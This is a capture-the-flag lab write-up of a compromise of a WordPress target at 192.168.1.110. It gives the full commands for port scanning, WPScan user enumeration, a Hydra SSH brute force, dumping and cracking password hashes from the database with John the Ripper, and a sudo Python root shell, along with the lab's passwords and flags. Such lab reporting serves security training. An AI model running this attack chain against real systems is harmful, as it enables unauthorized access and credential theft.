# Offensive: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

Command: `$ nmap -sV 192.168.1.110` or `$ nmap -A 192.168.1.0/24`

Output screenshot:

![Nmap 192 168 1 110](https://user-images.githubusercontent.com/85250007/174417286-7bd90ba5-e3cc-4109-abbd-e90624366fd9.gif)

This scan identifies the services below as potential points of entry:
**Target 1**
1. Port 22/TCP 	  Open 	SSH
2. Port 80/TCP 	  Open 	HTTP
3. Port 111/TCP 	Open 	rcpbind
4. Port 139/TCP 	Open 	netbios-ssn
5. Port 445/TCP 	Open 	netbios-ssn

### Critical Vulnerabilities
The following vulnerabilities were identified on each target:

**Target 1**
1. User Enumeration (WordPress site)
2. Weak User Password
3. Unsalted User Password Hash (WordPress database)
4. Misconfiguration of Python root User Privileges/Privilege Escalation
5. Improper configured SSH
6. No file security permission implemented



### Exploitation

The Offensive Team was able to penetrate `Target 1` and retrieve the following confidential data:
![save hashes and john the ripper them](https://user-images.githubusercontent.com/85250007/174421418-5f25f299-fe7a-4d8e-aa22-e4189bef7611.gif)

**Target 1**

- `Flag1: b9bbcb33ellb80be759c4e844862482d`

    - Exploit Used:
    - WPScan to enumerate users of the Target 1 WordPress site
    - Command: 
      - `$ wpscan --url http://192.168.1.110 --enumerate u`
 
 ![wpscanusers](https://user-images.githubusercontent.com/85250007/174419133-b072d0ae-c9c0-40c6-a6fa-336cf80698a3.png)
![Flag3](https://user-images.githubusercontent.com/85250007/174421144-315b9c85-f4da-4ce8-9837-9a3e52fbf809.gif)

   - Targeting User Michael
   - Executed Hydra Brute Force Attack
   - The following command was performed:
   -`hydra -l michael -P /usr/share/wordlists/rockyou.txt 192.168.1.110 ssh`
   - Password: Michael  
      
 ![Hydra brute Force](https://user-images.githubusercontent.com/85250007/174419194-4f8ce1aa-0f58-4f03-8433-d197edae8103.gif)

   - Capturing Flag 1: After SSH Brute Force Attack as Michael I traversed through directories and files.
   - Found Flag1 in  var/www/html folder at root in service.html in a HTML comment below the footer.
   - Commands:
        - `ssh michael@192.168.1.110`
        - `pw: michael`
        - `cd ../`
        - `cd ../`
        - `cd var/www/html`
        - `ls -l`
        - `nano service.html` 
        
![flag1](https://user-images.githubusercontent.com/85250007/174420761-94970862-acd1-4670-8d90-42a95f56fb4a.gif)


![Signin as Michael](https://user-images.githubusercontent.com/85250007/174419456-412018fe-aa33-4a1f-a433-6f23bf088b67.gif)

- `Flag2: fc3fd58dcdad9ab23faca6e9a3e581c`

   - Exploit Used:
   - Same exploit used to gain Flag 1.
   - Capturing Flag 2: While SSH in as user Michael Flag 2 was also found.
   - Once again traversing through directories and files as before Flag 2 was found in /var/www next to the html folder that held Flag 1.
   - Commands:
        - `ssh michael@192.168.1.110`
        - `pw: michael`
        - `cd ../`
        - `cd /var/www`
        - `find / i-name flag*`
        - `cat flag2.txt`

![Flag2](https://user-images.githubusercontent.com/85250007/174420694-4b41f777-5fa1-41d8-9588-77dd30409745.gif)

- `Flag3: afc01ab56b50591e7dccf93122770cd2`

    - Exploit Used:
    - Previous exploits used to gain Flag 1 and 2.
    - Capturing Flag 3: Accessing MySQL database.
    - Once having found wp-config.php and gaining access to the database credentials as Michael, MySQL was used to explore the database.
    - The wp-config.php displayed DB_Password in plaintext

![wp-configphp](https://user-images.githubusercontent.com/85250007/174420457-36498526-cf68-47e0-8563-9343d0a29da4.png)
      
   - Flag 3 was found in wp_posts table in the wordpress database.
   - Commands:
        - Connected to mysql: -u root -p R@v3nSecurity
          - `show databases;`
          - `use wordpress;`
          - `show tables;`
          - `select * from wp_posts;`

![Flag3](https://user-images.githubusercontent.com/85250007/174421155-f1f7ff1e-e7f7-469c-b48d-6a70d6e203a4.gif)

- `Flag4: 715dea6c055b9fe3337544932f2941ce`

    - Exploit Used:
    - Unsalted password hash and the use of privilege escalation with Python.
    - Capturing Flag 4: Retrieve user credentials from database, crack password hash with John the Ripper and use Python to gain root privileges.
    - Once having gained access to the database credentials as Michael from the wp-config.php file, lifting username and password hashes using MySQL was next. 
    - These user credentials are stored in the wp_users table of the wordpress database. The usernames and password hashes were copied/saved to the Kali machine in a file called wp_hashes.txt.
    - Commands:
         - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
         - `show databases;`
         - `use wordpress;` 
         - `show tables;`
         - `select * from wp_users;`

![mysql hashes found](https://user-images.githubusercontent.com/85250007/174421618-027c6170-266b-48e3-8432-ca68e7429c39.gif)

   - On the Kali local machine the wp_hashes.txt was run against John the Ripper to crack the hashes. 
   - Command:
        -`john wp_hashes.txt`
        
![save hashes and john the ripper them](https://user-images.githubusercontent.com/85250007/174421455-b1fed644-0b18-4c8f-9945-2b914db2048f.gif)

   - Once Steven’s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python
   - Commands: 
       - `ssh steven@192.168.1.110`
          - `pw:pink84`
          - `sudo -l`
          - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
          - `cd /root`
          - `ls`
          - `cat flag4.txt`

![Flag4](https://user-images.githubusercontent.com/85250007/174421352-a1c816d0-7442-40ac-aeed-8d4b2c66d8f9.gif)


















